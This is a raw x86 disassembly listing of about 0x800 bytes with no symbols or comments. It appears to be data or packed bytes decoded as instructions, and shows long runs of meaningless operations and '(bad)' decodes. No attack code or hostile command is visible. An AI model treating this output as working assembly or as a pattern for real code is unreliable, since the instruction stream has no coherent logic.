  402f15:	ins    BYTE PTR es:[edi],dx
  402f16:	add    DWORD PTR [eax],ebx
  402f18:	add    BYTE PTR [eax+0x0],ah
  402f1b:	adc    BYTE PTR [ecx],dh
  402f1d:	add    BYTE PTR [eax-0x5fef679e],ah
  402f23:	add    eax,0x80ca8010
  402f28:	or     BYTE PTR ds:0x820a384b,al
  402f2e:	pop    edx
  402f2f:	and    ebp,DWORD PTR [eax+eax*1+0x40]
  402f33:	add    al,0xc2
  402f35:	inc    eax
  402f36:	inc    edx
  402f37:	inc    eax
  402f38:	or     BYTE PTR [eax],al
  402f3a:	add    BYTE PTR [ecx+ebx*4],0x41
  402f3e:	arpl   WORD PTR [edx],ax
  402f40:	rol    BYTE PTR [edx+0x20],0x4
  402f44:	or     eax,0xd6001328
  402f49:	and    ah,BYTE PTR [esi]
  402f4b:	dec    ebx
  402f4c:	add    BYTE PTR [eax+0x6f000d11],cl
  402f52:	call   DWORD PTR ds:0x4133dc
  402f58:	bound  eax,QWORD PTR [ecx-0x6fbf3ef8]
  402f5e:	inc    esp
  402f5f:	add    al,0x29
  402f61:	add    al,al
  402f63:	and    DWORD PTR [ebp+0xa844048],eax
  402f69:	add    BYTE PTR [eax-0x38],al
  402f6c:	and    BYTE PTR [eax+0x15146788],0x15
  402f73:	add    al,0x81
  402f75:	or     al,BYTE PTR [ecx]
  402f77:	push   cs
  402f78:	add    BYTE PTR [eax],ah
  402f7a:	sbb    al,0x0
  402f7c:	add    cl,BYTE PTR ds:0x4210ad02
  402f82:	rcl    DWORD PTR [ecx],cl
  402f84:	nop
  402f85:	adc    eax,0x800481a8
  402f8a:	inc    eax
  402f8b:	or     BYTE PTR [ecx+0x46],al
  402f8e:	rcr    DWORD PTR es:[edx-0x3c],0xc1
  402f93:	pop    eax
  402f94:	add    BYTE PTR [bx+di+0x8be],0x34
  402f9a:	or     al,BYTE PTR [eax]
  402f9c:	ret    0x70
  402f9f:	or     al,BYTE PTR [ecx]
  402fa1:	inc    ecx
  402fa2:	adc    BYTE PTR [eax+0x14645020],0x0
  402fa9:	and    BYTE PTR [eax+edx*4],0x2e
  402fad:	adc    BYTE PTR [ebx*2+0xca1122a],0xc
  402fb5:	push   eax
  402fb6:	adc    BYTE PTR [ecx],0xe
  402fb9:	mov    al,ds:0x404182
  402fbe:	sbb    BYTE PTR [edx+0x0],dh
  402fc1:	sbb    BYTE PTR [ecx],0xa0
  402fc4:	add    DWORD PTR [edx],esp
  402fc6:	xchg   esi,eax
  402fc7:	adc    BYTE PTR [esi],ah
  402fc9:	(bad)  
  402fca:	xchg   ecx,eax
  402fcb:	mov    WORD PTR [eax+eax*2+0x39e04290],es
  402fd2:	add    al,0x2d
  402fd4:	mov    al,ds:0xc080b642
  402fd9:	add    BYTE PTR [ecx],dl
  402fdb:	inc    eax
  402fdc:	and    BYTE PTR [ecx],0x8a
  402fdf:	add    al,ah
  402fe1:	adc    al,0x8
  402fe3:	and    BYTE PTR [eax],al
  402fe5:	and    al,bl
  402fe7:	and    ch,BYTE PTR [eax+eax*4+0x4]
  402feb:	add    BYTE PTR [eax+0x23],dl
  402fee:	or     BYTE PTR [eax+0x31],al
  402ff1:	adc    BYTE PTR [eax-0x1b8ebdae],al
  402ff7:	sub    al,BYTE PTR [edx-0x48ff96fe]
  402ffd:	test   DWORD PTR [eax],esp
  402fff:	add    al,BYTE PTR [edi]
  403001:	add    al,BYTE PTR [ebx]
  403003:	inc    esp
  403004:	jmp    0xa54b328a
  403009:	add    eax,0x8154927
  40300e:	add    BYTE PTR [edx],0x8
  403011:	inc    eax
  403012:	add    BYTE PTR [ebx-0x75300000],al
  403018:	add    BYTE PTR ds:0x80a01808,ch
  40301e:	test   BYTE PTR [eax+eax*4],ah
  403021:	inc    esp
  403022:	sbb    DWORD PTR [eax+0x0],eax
  403025:	add    BYTE PTR [edx+0x89a4309],al
  40302b:	or     DWORD PTR [ecx],eax
  40302d:	sbb    DWORD PTR [eax],eax
  40302f:	add    al,0x1
  403031:	inc    eax
  403032:	add    al,0xe0
  403034:	add    BYTE PTR [esp+eax*2],al
  403037:	add    dl,BYTE PTR [eax]
  403039:	add    BYTE PTR [esi+0x4],dh
  40303c:	or     BYTE PTR [edx],al
  40303e:	push   0x22098494
  403043:	call   0x429a148
  403048:	adc    eax,0x20291040
  40304d:	add    al,BYTE PTR [eax]
  40304f:	add    al,0x1
  403051:	and    DWORD PTR [eax],ebp
  403053:	and    eax,0x81480122
  403058:	add    esp,edx
  40305a:	lock or BYTE PTR [eax],al
  40305d:	add    bl,al
  40305f:	nop
  403060:	adc    BYTE PTR [ecx+0x1],al
  403063:	add    bl,BYTE PTR [edx]
  403065:	dec    edx
  403066:	add    DWORD PTR [eax],ecx
  403068:	push   eax
  403069:	xor    cl,0x88
  40306c:	dec    ecx
  40306d:	sub    al,0x0
  40306f:	pop    esp
  403070:	fs inc eax
  403072:	or     DWORD PTR [edx+0x10],esp
  403075:	add    al,al
  403077:	dec    ecx
  403078:	add    DWORD PTR [eax],eax
  40307a:	inc    eax
  40307b:	mov    WORD PTR [edx-0x5eeedff0],es
  403081:	add    cl,0x28
  403084:	inc    ecx
  403085:	add    BYTE PTR [eax+0x70],al
  403088:	pusha  
  403089:	ror    DWORD PTR [eax+edi*2+0x46],0x1
  40308e:	add    DWORD PTR [ecx],eax
  403090:	mov    al,ds:0x950500
  403095:	add    DWORD PTR [ecx],0xe50
  40309b:	inc    ebx
  40309c:	fist   DWORD PTR [eax+0x8]
  40309f:	inc    eax
  4030a0:	push   es
  4030a1:	inc    eax
  4030a2:	test   eax,0xa882200
  4030a7:	mov    dl,0x0
  4030a9:	add    al,BYTE PTR [eax]
  4030ab:	adc    al,0x90
  4030ad:	mov    DWORD PTR [ecx],esp
  4030af:	sbb    al,0xa
  4030b1:	test   BYTE PTR [ecx],al
  4030b3:	les    esp,FWORD PTR [eax+0x42]
  4030b6:	or     al,BYTE PTR [ecx-0x57]
  4030b9:	add    eax,0x800040a0
  4030be:	or     dh,bl
  4030c0:	adc    BYTE PTR [eax+0x4104164],al
  4030c6:	adc    al,0x10
  4030c8:	cmp    BYTE PTR [ecx+0x0],al
  4030cb:	or     DWORD PTR [eax],eax
  4030cd:	inc    ax
  4030cf:	mov    ds:0x80c17191,al
  4030d4:	add    ah,al
  4030d6:	test   dl,al
  4030d8:	inc    esi
  4030d9:	add    BYTE PTR [eax+esi*1+0x0],0x20
  4030de:	or     BYTE PTR [eax],al
  4030e0:	sbb    cl,dl
  4030e2:	mov    ds:0x4b08c98c,eax
  4030e7:	add    al,BYTE PTR [edi+eiz*1]
  4030ea:	test   BYTE PTR [eax],bl
  4030ec:	sbb    BYTE PTR [eax+0x3ac19171],ch
  4030f2:	add    BYTE PTR [edx],dl
  4030f4:	add    ah,BYTE PTR [eax+edx*1]
  4030f7:	test   eax,0x12606ac4
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	add    BYTE PTR [eax],dh
  403100:	rol    BYTE PTR fs:[eax+0x0],1
  403104:	inc    edi
  403105:	add    BYTE PTR [eax],al
  403107:	add    BYTE PTR [eax],al
  403109:	sub    BYTE PTR [eax+0x8],al
  40310c:	inc    esi
  40310d:	mov    BYTE PTR [ecx-0x36],al
  403110:	add    BYTE PTR [ecx],ah
  403112:	mov    eax,ds:0x62190285
  403117:	add    BYTE PTR [eax],al
  403119:	lea    ecx,[eax]
  40311b:	xchg   BYTE PTR [eax+eax*1+0x22],dh
  40311f:	add    BYTE PTR [eax],bl
  403121:	add    al,0x10
  403123:	and    BYTE PTR [esi+eax*1-0x78],0x40
  403128:	ror    BYTE PTR [eax-0x62b7ba00],0x1
  40312f:	int3   
  403130:	xchg   edx,eax
  403131:	pusha  
  403132:	mov    al,ds:0xa4080314
  403137:	inc    eax
  403138:	xor    BYTE PTR cs:[ecx+0x0],ah
  40313c:	mov    ebp,0x163c0050
  403141:	dec    eax
  403142:	dec    edx
  403143:	add    BYTE PTR [eax-0x78],cl
  403146:	les    ecx,FWORD PTR [edx]
  403148:	adc    al,0x20
  40314a:	xchg   edx,eax
  40314b:	mov    ds:0x30016,al
  403150:	rol    BYTE PTR [ebx+0x4020003],0x85
  403157:	sahf   
  403158:	add    BYTE PTR [edx],ah
  40315a:	mov    WORD PTR [ecx],cs
  40315c:	sub    ah,BYTE PTR [eax+edx*2]
  40315f:	nop
  403160:	mov    dh,BYTE PTR [eax-0x75e38e7c]
  403166:	add    BYTE PTR ds:0x28008000,ah
  40316c:	adc    BYTE PTR [eax+eiz*1+0xd],dl
  403170:	mov    ah,0x82
  403172:	add    ah,BYTE PTR ds:0x4d0001
  403178:	test   BYTE PTR [ecx+0x22],cl
  40317b:	sub    BYTE PTR [ebx],ah
  40317d:	sub    BYTE PTR [eax+eiz*4],dl
  403180:	add    eax,0xa4004114
  403185:	add    al,0x40
  403187:	xchg   ecx,eax
  403188:	add    BYTE PTR [edx],0x96
  40318b:	add    BYTE PTR ds:0x9201d2a0,0x8c
  403192:	sbb    BYTE PTR [ecx-0x3febe000],0x42
  403199:	inc    edx
  40319a:	and    al,0x85
  40319c:	sbb    al,BYTE PTR [ecx+edi*1]
  40319f:	and    al,0xc8
  4031a1:	lods   al,BYTE PTR ds:[esi]
  4031a2:	adc    BYTE PTR [eax+eiz*2],al
  4031a5:	test   DWORD PTR [eax+0x40],eax
  4031a8:	and    BYTE PTR [edx-0x25ff37de],al
  4031ae:	sbb    dh,BYTE PTR [eax+0x12c901]
  4031b4:	add    dl,BYTE PTR [eax+eax*2]
  4031b7:	or     eax,DWORD PTR [edx]
  4031b9:	sbb    BYTE PTR [eax+0x51],al
  4031bc:	and    BYTE PTR [ebp-0x7fba7ee6],bh
  4031c2:	or     BYTE PTR [eax],dl
  4031c4:	add    BYTE PTR [edi+0x8],0x0
  4031c8:	dec    ebp
  4031c9:	loopne 0x4031d0
  4031cb:	xor    eax,0x50281380
  4031d0:	and    ecx,edx
  4031d2:	add    BYTE PTR [edx],al
  4031d4:	(bad)  
  4031d5:	nop
  4031d6:	or     al,BYTE PTR [ebx+0x28006004]
  4031dc:	add    eax,DWORD PTR [eax+ebx*4+0x4e]
  4031e0:	add    BYTE PTR [eax-0x77],cl
  4031e3:	dec    eax
  4031e4:	add    BYTE PTR [ebx],0x4
  4031e7:	and    BYTE PTR [eax+0x6],ah
  4031ea:	inc    eax
  4031eb:	xchg   DWORD PTR [ebx],ecx
  4031ed:	jo     0x403243
  4031ef:	add    al,0x74
  4031f1:	sbb    DWORD PTR [eax+0x0],eax
  4031f4:	and    DWORD PTR [eax+eax*2],eax
  4031f7:	and    DWORD PTR [ecx],0x60
  4031fa:	mov    BYTE PTR [edx+ecx*1+0x25],ah
  4031fe:	stos   DWORD PTR es:[edi],eax
  4031ff:	popa   
  403200:	inc    ecx
  403201:	or     eax,0x4040b101
  403206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403207:	xchg   ecx,eax
  403208:	add    DWORD PTR [ecx],eax
  40320a:	inc    ecx
  40320b:	add    BYTE PTR es:[eax-0x78],cl
  40320f:	push   ss
  403210:	adc    al,0x5
  403212:	add    DWORD PTR [esp+ecx*2+0x108a22c4],eax
  403219:	push   ds
  40321a:	add    BYTE PTR [eax],0x89
  40321d:	or     BYTE PTR [ebx],al
  40321f:	shl    BYTE PTR [eax],1
  403221:	add    BYTE PTR ds:0x2380640,al
  403227:	add    BYTE PTR [eax],0x86
  40322a:	mov    al,ds:0xc0800018
  40322f:	add    BYTE PTR [eax],cl
  403231:	adc    BYTE PTR [edx],bl
  403233:	xchg   ecx,eax
  403234:	add    BYTE PTR [eax],al
  403236:	inc    eax
  403237:	cmp    DWORD PTR [eax],eax
  403239:	and    BYTE PTR [eax],ah
  40323b:	adc    BYTE PTR [eax+0x10],0x40
  40323f:	add    BYTE PTR [eax],dl
  403241:	loopne 0x4031cc
  403243:	and    BYTE PTR [eax-0x1fe7ffdd],0xf8
  40324a:	dec    eax
  40324b:	add    BYTE PTR [ecx+0x1d],ah
  40324e:	or     BYTE PTR [eax],al
  403250:	and    al,BYTE PTR [esi-0x7edfbfa0]
  403256:	add    BYTE PTR [eax],al
  403258:	sbb    BYTE PTR [eax+eiz*2],al
  40325b:	add    DWORD PTR [edx],eax
  40325d:	inc    ecx
  40325e:	loopne 0x403276
  403260:	or     al,ah
  403262:	inc    eax
  403263:	and    al,0x15
  403265:	add    al,0x0
  403267:	stos   BYTE PTR es:[edi],al
  403268:	adc    BYTE PTR [eax+0x41],al
  40326b:	and    BYTE PTR [edx+edx*1],al
  40326e:	or     DWORD PTR [edx+0x5a200220],ebp
  403274:	mov    al,ds:0x4001008d
  403279:	rcr    BYTE PTR [edx],0x1f
  40327c:	push   eax
  40327d:	add    al,0x8
  40327f:	imul   ecx,DWORD PTR [edx],0x4c007098
  403285:	or     BYTE PTR [eax+0x1c05910],0x8
  40328c:	nop
  40328d:	jns    0x40328f
  40328f:	and    DWORD PTR [esi],ecx
  403291:	add    BYTE PTR [edx+0x4004133],al
  403297:	and    BYTE PTR [edx+0x0],al
  40329a:	cwde   
  40329b:	add    BYTE PTR [eax-0x40],al
  40329e:	add    esp,DWORD PTR [ecx+0x45]
  4032a1:	and    cl,BYTE PTR [ecx]
  4032a3:	xor    BYTE PTR [edx],al
  4032a5:	xor    BYTE PTR [eax+0x41804100],dl
  4032ab:	inc    ecx
  4032ac:	je     0x4032ee
  4032ae:	add    BYTE PTR [eax],al
  4032b0:	and    DWORD PTR [eax],esp
  4032b2:	add    al,BYTE PTR [eax]
  4032b4:	add    al,BYTE PTR [edx]
  4032b6:	mov    bl,0xc0
  4032b8:	pusha  
  4032b9:	mov    eax,DWORD PTR [eax+0x48]
  4032bc:	nop
  4032bd:	add    al,0x80
  4032c0:	mov    al,ds:0x80a00608
  4032c5:	test   BYTE PTR [esi],dl
  4032c7:	nop
  4032c8:	push   esp
  4032c9:	cmp    BYTE PTR [esi+eax*4+0x11003a1],dl
  4032d0:	adc    DWORD PTR [edx+eax*2],edx
  4032d3:	adc    ecx,DWORD PTR ds:0x889a1010
  4032d9:	inc    esp
  4032da:	inc    eax
  4032db:	inc    eax
  4032dc:	mov    ds:0x80604217,al
  4032e1:	adc    DWORD PTR [eax],0x20080a3c
  4032e7:	loopne 0x4032e9
  4032e9:	add    BYTE PTR [eax+0x1],al
  4032ec:	add    ecx,DWORD PTR ds:0x3e6b0384
  4032f2:	add    al,0x5
  4032f4:	and    al,0x80
  4032f6:	add    eax,esp
  4032f8:	and    BYTE PTR [edx+edx*2],ch
  4032fb:	cli    
  4032fc:	adc    BYTE PTR [eax],al
  4032fe:	push   cs
  4032ff:	adc    cl,BYTE PTR [eax]
  403301:	mov    BYTE PTR [eax],dl
  403303:	dec    eax
  403304:	add    BYTE PTR [eax],ah
  403306:	and    DWORD PTR [eax],ecx
  403308:	sub    ch,BYTE PTR [eax-0x4f]
  40330b:	mov    eax,ds:0x1b0a5810
  403310:	mov    WORD PTR [ecx],es
  403312:	fst    QWORD PTR [eax]
  403314:	dec    ecx
  403315:	mov    BYTE PTR [esp+eax*1+0x10],cl
  403319:	and    DWORD PTR [eax],0x790414
  40331f:	add    BYTE PTR [eax],al
  403321:	test   DWORD PTR [ebp-0x80],ebx
  403324:	dec    eax
  403325:	add    BYTE PTR [edx],0x8
  403328:	rol    DWORD PTR [eax-0x78],0x0
  40332c:	rcl    BYTE PTR [ebp+0x3442e48a],0x16
  403333:	add    BYTE PTR [edx],dl
  403335:	pop    ss
  403336:	test   BYTE PTR ds:0x8b04660c,al
  40333c:	add    DWORD PTR [eax],esp
  40333e:	add    BYTE PTR [ecx+eax*8],al
  403341:	and    BYTE PTR [esp+ecx*1],al
  403344:	sub    BYTE PTR [edi+0x62],al
  403347:	add    al,0x0
  403349:	or     BYTE PTR ds:0xa2020531,al
  40334f:	add    DWORD PTR [edx],edx
  403351:	add    BYTE PTR [ecx],al
  403353:	add    cl,ah
  403355:	add    BYTE PTR [ecx],0x80
  403358:	add    DWORD PTR [eax+0x22],ecx
  40335b:	and    BYTE PTR [eax+0x0],ah
  40335e:	mov    al,ds:0x886801
  403363:	add    DWORD PTR [eax],eax
  403365:	add    al,0x40
  403367:	mov    al,ah
  403369:	pop    ebp
  40336a:	add    BYTE PTR [esi],ah
  40336c:	xchg   ebx,eax
  40336d:	adc    BYTE PTR [edx],al
  40336f:	add    BYTE PTR [ecx],al
  403371:	aaa    
  403372:	shl    BYTE PTR [ebp+0x70e0001],0x8
  403379:	pusha  
  40337a:	or     al,BYTE PTR [eax+0x20]
  40337d:	and    BYTE PTR [eax+edx*1+0x180d030],al
  403384:	leave  
  403385:	mov    ah,0x58
  403387:	add    al,0x9
  403389:	and    eax,0x414810d4
  40338e:	add    BYTE PTR [eax],al
  403390:	add    BYTE PTR [ebx],ah
  403392:	xor    BYTE PTR [edi],cl
  403394:	adc    BYTE PTR [edx],al
  403396:	sub    eax,0x95a8001
  40339b:	add    BYTE PTR [eax],dl
  40339d:	or     BYTE PTR [eax+0x8],bl
  4033a0:	mov    ah,0x5
  4033a2:	xor    al,0xc4
  4033a4:	fld    TBYTE PTR ds:0x40ac80a
  4033aa:	inc    eax
  4033ab:	add    DWORD PTR [eax+ebx*1],eax
  4033ae:	adc    al,al
  4033b0:	or     ah,al
  4033b2:	sub    ch,BYTE PTR [ebx]
  4033b4:	and    BYTE PTR [esi+eax*1+0x20c444c],dl
  4033bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033bc:	add    al,0x2c
  4033be:	jecxz  0x403400
  4033c0:	and    BYTE PTR [ebp-0x6ce3fbf6],dl
  4033c6:	push   eax
  4033c7:	adc    BYTE PTR [eax-0x7d],0x4c
  4033cb:	push   edx
  4033cc:	add    eax,0x1b00002
  4033d1:	add    al,0x89
  4033d3:	ror    DWORD PTR [eax+0x10b0006],0x4
  4033da:	loopne 0x4033e4
  4033dc:	adc    BYTE PTR [eax-0x7b],al
  4033df:	and    cl,BYTE PTR [ecx]
  4033e1:	and    BYTE PTR [eax],al
  4033e3:	add    al,BYTE PTR [eax+eax*8]
  4033e6:	mov    al,0x0
  4033e8:	and    DWORD PTR [edx+0x2200a014],esi
  4033ee:	inc    eax
  4033ef:	and    bl,BYTE PTR [ecx]
  4033f1:	or     BYTE PTR [eax],ch
  4033f3:	bound  eax,QWORD PTR [ecx+ebp*1]
  4033f6:	sub    BYTE PTR [ebx],al
  4033f8:	add    al,0x22
  4033fa:	inc    eax
  4033fb:	inc    edx
  4033fc:	mov    al,ds:0xc150617c
  403401:	add    BYTE PTR [eax],0x50
  403404:	add    edi,DWORD PTR [eax]
  403406:	and    BYTE PTR [ecx],al
  403408:	sbb    DWORD PTR [esp+0x586e06c],eax
  40340f:	xor    DWORD PTR [eax],eax
  403411:	xchg   ebp,eax
  403412:	inc    eax
  403413:	adc    DWORD PTR [ecx],0x2b80129
  403419:	add    BYTE PTR [ebp+0x83041],al
  40341f:	add    BYTE PTR [esp+eax*4+0x40182480],cl
  403426:	inc    ecx
  403427:	and    DWORD PTR [ecx+ebx*2-0x1e],ecx
  40342b:	sbb    BYTE PTR [eax+0x50],0x0
  40342f:	adc    BYTE PTR [eax+eiz*1+0x50],0xe6
  403434:	sbb    BYTE PTR [ecx],al
  403436:	pop    DWORD PTR [esi]
  403438:	adc    eax,0xab41221a
  40343d:	add    al,al
  40343f:	add    al,0x0
  403441:	add    al,0xe0
  403443:	add    BYTE PTR [eax-0x5e7db760],ch
  403449:	or     BYTE PTR [ebp+0x20030840],dl
  40344f:	cwde   
  403450:	or     BYTE PTR [esp+eax*2],cl
  403453:	or     BYTE PTR [edx],dl
  403455:	dec    ecx
  403456:	or     al,0x40
  403458:	add    al,BYTE PTR [edx]
  40345a:	or     BYTE PTR [edx-0x60],dl
  40345d:	ror    BYTE PTR [ecx],0x3c
  403460:	add    BYTE PTR [eax],al
  403462:	fadd   QWORD PTR [edx+0x6e00049]
  403468:	adc    bh,cl
  40346a:	and    BYTE PTR [ecx-0x6d],dl
  40346d:	add    BYTE PTR [edx],0x4
  403470:	add    DWORD PTR [edx],eax
  403472:	and    BYTE PTR es:[ebx+0x20],al
  403476:	add    BYTE PTR [ebx],0x20
  403479:	or     DWORD PTR [ecx],eax
  40347b:	adc    ebx,DWORD PTR [edx]
  40347d:	xor    al,0x4
  40347f:	cmp    BYTE PTR [eax],cl
  403481:	or     BYTE PTR [ecx],cl
  403483:	push   eax
  403484:	inc    esp
  403485:	add    DWORD PTR [eax],eax
  403487:	add    cl,BYTE PTR [eax]
  403489:	add    DWORD PTR [eax-0x7acff7f6],edx
  40348f:	push   eax
  403490:	sbb    BYTE PTR [eax+ecx*8],dh
  403493:	adc    ecx,DWORD PTR [esi+0x20187b08]
  403499:	mov    esp,cs
  40349b:	add    DWORD PTR [eax+0x2],esp
  40349e:	add    al,0x90
  4034a0:	test   al,0xea
  4034a2:	add    DWORD PTR [ecx],ecx
  4034a4:	test   al,0x85
  4034a6:	int3   
  4034a7:	aam    0x12
  4034a9:	add    DWORD PTR [eax],eax
  4034ab:	jae    0x403442
  4034ad:	push   cs
  4034ae:	add    esp,0x44008022
  4034b4:	mov    al,ds:0x900018
  4034b9:	lds    eax,FWORD PTR [eax+0x7f103d]
  4034bf:	dec    ecx
  4034c0:	xor    BYTE PTR [eax],ah
  4034c2:	mov    BYTE PTR [eax+edx*4+0x12a50786],dl
  4034c9:	fs pop eax
  4034cb:	or     BYTE PTR [edx+0x22],al
  4034ce:	add    BYTE PTR [edx],dl
  4034d0:	mov    ds:0x34062a48,al
  4034d5:	add    BYTE PTR [eax+0x38481020],ah
  4034db:	xor    BYTE PTR [eax+0x58],al
  4034de:	sbb    BYTE PTR [ecx+0x41],0x90
  4034e2:	add    ah,BYTE PTR [ecx]
  4034e4:	add    BYTE PTR [edx-0x78],dl
  4034e7:	inc    eax
  4034e8:	or     esp,DWORD PTR [ecx+0x41480806]
  4034ee:	mov    BYTE PTR [edx+0x22010408],al
  4034f4:	add    dl,BYTE PTR [ecx]
  4034f6:	scas   eax,DWORD PTR es:[edi]
  4034f7:	push   ecx
  4034f8:	push   ebp
  4034f9:	add    BYTE PTR [eax],al
  4034fb:	sub    al,0x0
  4034fd:	inc    edx
  4034fe:	push   0x0
  403500:	sbb    DWORD PTR [ebp+0x0],eax
  403503:	sbb    eax,0x82ce0080
  403508:	add    al,ah
  40350a:	xor    BYTE PTR [eax+ebx*2-0x2d],0x82
  40350f:	or     BYTE PTR [esi+eiz*4],al
  403512:	or     BYTE PTR [ebp-0x6c],al
  403515:	adc    DWORD PTR [edx],esp
  403517:	loopne 0x4034a1
  403519:	gs dec ebp
  40351b:	add    BYTE PTR [eax+0x6398040],cl
  403521:	and    BYTE PTR [esi],al
  403523:	add    BYTE PTR [eax],0x3d
  403526:	adc    al,0xc
  403528:	and    al,0x0
  40352a:	sbb    BYTE PTR [ecx+0x0],ah
  40352d:	or     al,BYTE PTR [ecx]
  40352f:	add    al,BYTE PTR [eax+0x269100ae]
  403535:	dec    ebp
  403536:	or     eax,0x41bd4811
  40353b:	adc    al,0xa
  40353d:	sbb    BYTE PTR [esi+0x18002108],dl
  403543:	mov    ds:0x95c810,al
  403548:	or     al,0x21
  40354a:	adc    BYTE PTR [eax],al
  40354c:	adc    BYTE PTR [eax+edx*1+0x60],al
  403550:	and    BYTE PTR [eax-0x7ebfb6f5],ah
  403556:	inc    ebp
  403557:	add    BYTE PTR ds:0x30424428,bl
  40355d:	add    BYTE PTR [eax+0x14c0b249],cl
  403563:	or     BYTE PTR [ecx+edx*1+0x13404208],cl
  40356a:	or     al,0x84
  40356c:	rcl    BYTE PTR [eax+0x1c920],0x51
  403573:	sbb    DWORD PTR [eax+ebp*8],eax
  403576:	sbb    BYTE PTR [eax+0x1069c82],al
  40357c:	adc    DWORD PTR [edx],eax
  40357e:	add    DWORD PTR [edx],0x0
  403581:	int    0x40
  403583:	dec    eax
  403584:	je     0x4035ca
  403586:	pop    ecx
  403587:	loopne 0x403599
  403589:	add    BYTE PTR [ebx],0x68
  40358c:	add    BYTE PTR [ecx],al
  40358e:	add    al,0xa2
  403590:	enter  0xb500,0x8
  403594:	inc    esi
  403595:	and    BYTE PTR [edx],dl
  403597:	mov    BYTE PTR [eax],dh
  403599:	add    BYTE PTR [edx],ah
  40359b:	or     BYTE PTR [eax],cl
  40359d:	adc    DWORD PTR [edx],esp
  40359f:	xor    dh,0xf0
  4035a2:	sub    DWORD PTR [eax],esi
  4035a4:	add    eax,0x1250404
  4035a9:	pop    es
  4035aa:	push   eax
  4035ab:	add    cl,BYTE PTR [eax+eiz*1]
  4035ae:	mov    BYTE PTR [eax],bl
  4035b0:	jmp    0x904667b5
  4035b5:	add    BYTE PTR [edx],bl
  4035b7:	or     DWORD PTR [eax+0x8f80826],0x10480240
  4035c1:	mov    al,ds:0x4a0b1170
  4035c6:	or     al,0x11
  4035c8:	js     0x4035f6
  4035ca:	push   eax
  4035cb:	inc    esi
  4035cc:	inc    eax
  4035cd:	sbb    BYTE PTR [eax+eax*1],al
  4035d0:	add    BYTE PTR [eax],al
  4035d2:	xor    eax,0x98626006
  4035d7:	add    BYTE PTR [eax],cl
  4035d9:	add    BYTE PTR [esi],0x10
  4035dc:	adc    BYTE PTR [edx],0x11
  4035df:	add    DWORD PTR [eax+0x401006a0],esp
  4035e5:	inc    eax
  4035e6:	adc    al,BYTE PTR [eax]
  4035e8:	add    BYTE PTR ds:0xe9201c08,ch
  4035ee:	push   ecx
  4035ef:	add    DWORD PTR [edx+0x3],eax
  4035f2:	xor    eax,0x40440e2a
  4035f7:	add    BYTE PTR [edx],0x41
  4035fa:	and    BYTE PTR [eax+0x20],0x10
  4035fe:	add    BYTE PTR [ebx+eiz*2],0x64
  403602:	rcl    BYTE PTR [ecx],1
  403604:	add    BYTE PTR [eax],al
  403606:	add    al,BYTE PTR ds:0x40400921
  40360c:	add    BYTE PTR [ecx+0x194000e0],cl
  403612:	add    BYTE PTR [eax+0x0],0x4
  403616:	aad    0xa
  403618:	or     DWORD PTR [eax+eax*1-0x35ffb950],eax
  40361f:	add    BYTE PTR [ecx],al
  403621:	add    eax,0x415d918
  403626:	add    eax,0x80454cc
  40362b:	pusha  
  40362c:	inc    eax
  40362d:	or     BYTE PTR [eax],al
  40362f:	inc    eax
  403630:	add    eax,0x26ac0
  403635:	adc    al,0x70
  403637:	sub    BYTE PTR [eax],ah
  403639:	add    eax,ecx
  40363b:	push   es
  40363c:	xor    eax,0x48412c0
  403641:	inc    esp
  403642:	sbb    al,0x10
  403644:	dec    eax
  403645:	and    BYTE PTR [eax],al
  403647:	sub    ah,dl
  403649:	xor    eax,0x9c20493a
  40364e:	test   DWORD PTR [edx],esi
  403650:	xchg   esp,eax
  403651:	push   es
  403652:	add    cl,BYTE PTR [ebx+0x1b]
  403655:	add    eax,eax
  403657:	add    dl,BYTE PTR [eax]
  403659:	inc    eax
  40365a:	push   es
  40365b:	test   DWORD PTR [ebx],esp
  40365d:	add    DWORD PTR [edx],0x84069033
  403663:	shl    BYTE PTR [ecx],0x46
  403666:	adc    eax,0x18a2012
  40366b:	add    BYTE PTR [eax+esi*4],dl
  40366e:	test   al,0x21
  403670:	nop
  403671:	mov    BYTE PTR ds:0x31441004,dl
  403677:	and    eax,0xf41c0201
  40367c:	add    BYTE PTR [eax-0x73d76be0],al
  403682:	cwde   
  403683:	or     al,0x21
  403685:	adc    BYTE PTR [esi],al
  403687:	jle    0x403634
  403689:	inc    eax
  40368a:	and    DWORD PTR [edx],esp
  40368c:	shl    BYTE PTR [ebp+0x3a20204],1
  403692:	fimul  DWORD PTR [eax]
  403694:	and    BYTE PTR [eax+eax*2+0x8],ch
  403698:	adc    BYTE PTR [ecx+0x2],cl
  40369b:	add    cl,BYTE PTR [edx]
  40369d:	inc    ecx
  40369e:	add    eax,0x10082402
  4036a3:	dec    ecx
  4036a4:	dec    edx
  4036a5:	pop    esp
  4036a6:	adc    BYTE PTR [eax],al
  4036a8:	add    BYTE PTR [edx+0x3],al
  4036ab:	push   es
  4036ac:	add    cl,al
  4036ae:	mov    BYTE PTR [ecx],ch
  4036b0:	add    BYTE PTR [eax-0x5efb3eb6],0x53
  4036b7:	add    BYTE PTR [eax],0x84
  4036ba:	inc    eax
  4036bb:	add    DWORD PTR [eax+eiz*1+0x13],eax
  4036bf:	adc    BYTE PTR [edx+0x51],al
  4036c2:	add    BYTE PTR [eax+0x43440881],al
  4036c8:	pop    edx
  4036c9:	inc    eax
  4036ca:	xchg   esp,eax
  4036cb:	and    al,0x20
  4036cd:	mov    ch,ah
  4036cf:	adc    BYTE PTR [eax],0x92
  4036d2:	xor    BYTE PTR [eax+0x2073c852],al
  4036d8:	add    BYTE PTR [eax],cl
  4036da:	adc    BYTE PTR [eax+0x19d78021],al
  4036e0:	cwde   
  4036e1:	xchg   BYTE PTR [esi],al
  4036e3:	sbb    al,0x20
  4036e5:	lods   al,BYTE PTR ds:[esi]
  4036e6:	or     BYTE PTR [eax],al
  4036e8:	and    BYTE PTR [ecx],dh
  4036ea:	add    cl,BYTE PTR [eax]
  4036ec:	or     al,0x42
  4036ee:	cmovp  edx,DWORD PTR [esi]
  4036f1:	xor    BYTE PTR ds:0x211000a,dl
  4036f7:	inc    edi
  4036f8:	add    DWORD PTR ds:0x209031,eax
  4036fe:	imul   ecx,DWORD PTR [esp+0x40db010c],0x80000805
  403709:	or     al,0x4
  40370b:	or     BYTE PTR [eax],0x0
  40370e:	inc    ebp
  40370f:	add    DWORD PTR [ecx],esp
  403711:	adc    BYTE PTR [esi+0x1300821],al
  403717:	xor    BYTE PTR [eax],ah
  403719:	inc    ebx
  40371a:	adc    al,BYTE PTR [ecx]
